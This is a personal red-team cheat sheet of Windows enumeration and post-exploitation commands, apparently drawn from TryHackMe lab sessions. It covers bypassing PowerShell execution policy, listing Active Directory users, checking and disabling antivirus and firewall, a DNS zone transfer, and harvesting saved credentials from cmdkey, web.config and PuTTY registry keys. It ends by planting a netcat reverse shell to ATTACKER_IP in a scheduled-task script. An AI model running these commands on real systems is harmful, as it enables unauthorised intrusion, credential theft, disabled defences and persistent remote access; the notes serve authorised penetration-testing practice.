# Red Teaming Notes

---------------------------------

|Version | Last Updated | copyright
----|-----|----
1.0.3 | 08/03/23 | [@prakashchand72](https://forsec.me/whoami)

----------------------------------

**bypassing script execution**

```css
powershell -ex bypass -File .\sample.ps1
```


**can also be come with**

```sh
set-executionpolicy -scope currentuser remotesigned
```

**The following PowerShell command is to get all active directory user accounts. Note that we need to use  -Filter argument.**

```java
PS C:\Users\thm> Get-ADUser  -Filter *
DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com

Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
UserPrincipalName :
PS C:\Users\thm>
```

_Using the SearchBase option, we specify a specific Common-Name CN in the active directory. For example, we can specify to list any user(s) that part of Users._

```java
PS C:\Users\thm> Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"


DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
UserPrincipalName :

```

**Check antivirus which and how many**

```cmd
PS C:\Users\thm> wmic /namespace:\\root\securitycenter2 path antivirusproduct
```
_can also be done with another command_ 

```cmd
PS C:\Users\thm> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct


displayName              : Bitdefender Antivirus
instanceGuid             : {BAF124F4-FA00-8560-3FDE-6C380446AEFB}
pathToSignedProductExe   : C:\Program Files\Bitdefender\Bitdefender Security\wscfix.exe
pathToSignedReportingExe : C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe
productState             : 266240
timestamp                : Wed, 15 Dec 2021 12:40:10 GMT
PSComputerName           :

displayName              : Windows Defender
instanceGuid             : {D58FFC3A-813B-4fae-9E44-DA132C9FAA36}
pathToSignedProductExe   : windowsdefender://
pathToSignedReportingExe : %ProgramFiles%\Windows Defender\MsMpeng.exe
productState             : 393472
timestamp                : Fri, 15 Oct 2021 22:32:01 GMT
PSComputerName           :
```


**To check status of antivirus**

_for specific output like realtime_

```cmd
PS C:\Users\thm> Get-MpComputerStatus | select RealTimeProtectionEnabled  (mppreference if not worked ) 

RealTimeProtectionEnabled
-------------------------
                    False
```

_for all output of antivirus_

```cmd
PS C:\Users\thm> Get-MpComputerStatus
```

**for firewall**

```cmd
PS C:\Users\thm> Get-NetFirewallProfile | Format-Table Name, Enabled

Name    Enabled
----    -------
Domain     True
Private    True
Public     True
```

_to disable the firewall_

```cmd
PS C:\Windows\system32> Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
PS C:\Windows\system32> Get-NetFirewallProfile | Format-Table Name, Enabled
---- -------
Domain False
Private False
Public False
```

_to get firewall rules_

```java
PS C:\Users\thm> Get-NetFirewallRule | select DisplayName, Enabled, Description

DisplayName                                                                  Enabled
-----------                                                                  -------
Virtual Machine Monitoring (DCOM-In)                                           False
Virtual Machine Monitoring (Echo Request - ICMPv4-In)                          False
Virtual Machine Monitoring (Echo Request - ICMPv6-In)                          False
Virtual Machine Monitoring (NB-Session-In)                                     False
Virtual Machine Monitoring (RPC)                                               False
SNMP Trap Service (UDP In)                                                     False
SNMP Trap Service (UDP In)                                                     False
Connected User Experiences and Telemetry                                        True
Delivery Optimization (TCP-In)                                                  True
```

**To see avaiable event log option through powershell**

```java
PS C:\Users\thm> Get-EventLog -List

  Max(K) Retain OverflowAction        Entries Log
  ------ ------ --------------        ------- ---
     512      7 OverwriteOlder             59 Active Directory Web Services
  20,480      0 OverwriteAsNeeded         512 Application
     512      0 OverwriteAsNeeded         170 Directory Service
 102,400      0 OverwriteAsNeeded          67 DNS Server
  20,480      0 OverwriteAsNeeded       4,345 System
  15,360      0 OverwriteAsNeeded       1,692 Windows PowerShell
```

**To get all the installed application and it's version**

```java
PS C:\Users\thm> wmic product get name,version
Name                                                            Version
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     14.28.29910
AWS Tools for Windows                                           3.15.1248
Amazon SSM Agent                                                3.0.529.0
aws-cfn-bootstrap                                               2.0.5
AWS PV Drivers                                                  8.3.4
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  14.28.29910
```

**To see hidden directory/files**

```cmd
PS C:\Users\thm> Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\
```


**To check windows services**

```cmd
net start
```

**To Listening ports**

```cmd
netstat -aon
```

_you can also use `findstr` to find specific port on listening like `netstat -aon | findstr "22"`_


**To find which service on path running on port**

```cmd
tasklist /svc /FI "PID eq <pidnumber>"
```

**To check users** 

```cmd
net user
```

_You can discover the available groups using `net group` if the system is a Windows Domain Controller or `net localgroup` otherwise,__

**DNS Zone Transer**

```bash
dig -t AXFR redteam.thm @10.10.243.185
```

**to check avaible shamba share**

    net share


**to check network event**

```bash
/opt/snmpcheck/snmpcheck.rb $IP -c COMMUNITY_STRING
```

**To check powershell history / remember to use below command on command prompt only**

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**To check saved Credentials**

```cmd
cmdkey /list
```

**and to run saved crentials user as cmd type**

```cmd
runas /savecred /user:userfromsavedcreds cmd.exe
```

**IIS configuraiton ( web server to see saved creds)** 

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**Retrieve Credentials from Software: PuTTY**

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**To Check Permission of file**

```cmd
icacls c:\tasks\schtask.bat
```

**To seee the schedular tasks**

```cmd
schtasks
```

**To add to schedular task if have approprite permmsion** 

```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
